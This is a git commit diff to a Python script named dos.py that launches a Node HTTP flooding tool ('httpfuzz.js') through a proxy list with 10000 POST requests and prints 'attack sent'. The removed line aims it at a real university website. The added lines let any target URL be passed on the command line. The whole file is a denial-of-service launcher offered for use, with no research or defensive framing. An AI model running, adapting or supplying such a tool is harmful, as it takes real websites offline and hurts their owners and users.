de50aad88840f197cade47ec3328c2c46900749e
baphomet-disciple <122203558+baphomet-disciple@users.noreply.github.com>
2023-02-12 21:25:28 +0530

    Update dos.py

--- dos.py
+++ dos.py
@@ -1,4 +1,10 @@
+import sys
 import subprocess
 
-subprocess.Popen(["node", "httpfuzz.js", "https://www.iitb.ac.in", "proxy.txt", "10000", "POST"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+if len(sys.argv) < 2:
+    print("Please provide the website URL as a command line argument.")
+    sys.exit(1)
+
+website = sys.argv[1]
+subprocess.Popen(["node", "httpfuzz.js", website, "proxy.txt", "10000", "POST"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 print("attack sent")
